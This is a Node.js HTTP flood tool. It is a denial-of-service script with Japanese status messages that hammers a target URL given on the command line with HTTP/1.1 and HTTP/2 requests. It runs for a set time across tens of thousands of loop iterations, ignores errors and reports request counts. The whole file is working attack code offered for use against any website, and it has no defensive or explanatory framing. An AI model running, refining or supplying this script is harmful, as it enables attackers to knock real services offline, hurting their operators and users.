const http = require('http');
const https = require('https');
const http2 = require('http2');
const { URL } = require('url');
const os = require('os');

const THREADS = 30000; // Max threads for requests (adjust as needed)
const TIME = 30 * 1000; // Time in ms (adjust duration)
let H1 = 0, H2 = 0, TOTAL = 0;

function startAttack(target) {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const port = url.port || (isHttps ? 443 : 80);
    const path = url.pathname + url.search;

    // Fire HTTP/1.1 request
    const fireH1 = () => {
        const req = (isHttps ? https : http).request({
            hostname: url.hostname,
            port,
            method: 'GET',
            path,
            agent: false
        }, () => {}).on('error', () => {});
        req.end();
        H1++;
    };

    // Fire HTTP/2 request
    const fireH2 = () => {
        try {
            const client = http2.connect(url.origin);
            const req = client.request({ ':path': path });
            req.on('error', () => {});
            req.end();
            H2++;
            client.close();
        } catch {}
    };

    const startTime = Date.now();
    const endTime = startTime + TIME;

    const logInterval = setInterval(() => {
        const remaining = (endTime - Date.now()) / 1000;
        if (remaining <= 0) {
            clearInterval(logInterval);
            printEndReport();
        } else {
            printRunningReport(remaining);
        }
    }, 200); // Updates every 200ms

    // Start the attack
    console.log("攻撃開始!\n");

    for (let i = 0; i < THREADS; i++) {
        setImmediate(() => {
            while (Date.now() < endTime) {
                fireH1();
                fireH2();
                TOTAL++;
            }
        });
    }

    // Print Start Report
    printStartReport();

    // Print reports at intervals without slowing down
    function printStartReport() {
        console.clear();
        console.log('  攻撃開始:');
        console.log('  ============================================');
        console.log(`  ターゲット: ${target}`);
        console.log(`  時間: ${TIME / 1000}s`);
        console.log(`  最大スレッド数: ${THREADS}`);
        console.log('  ============================================\n');
    }

    function printRunningReport(remaining) {
        process.stdout.write(`\rH2リクエスト: ${H2} | H1リクエスト: ${H1} | 合計リクエスト: ${TOTAL} | 残り時間: ${remaining.toFixed(1)}s`);
    }

    function printEndReport() {
        const elapsed = (Date.now() - startTime) / 1000;
        console.log('\n\n攻撃完了!');
        console.log('  ============================================');
        console.log(`  実行時間: ${elapsed.toFixed(1)}s`);
        console.log(`  合計リクエスト: ${TOTAL}`);
        console.log(`  H1リクエスト: ${H1}`);
        console.log(`  H2リクエスト: ${H2}`);
        console.log('  ============================================\n');
        process.exit(0);
    }
}

// Example usage
const target = process.argv[2];
if (!target) {
    console.log('使用方法: node gng.js https://example.com');
    process.exit(1);
}
startAttack(target);
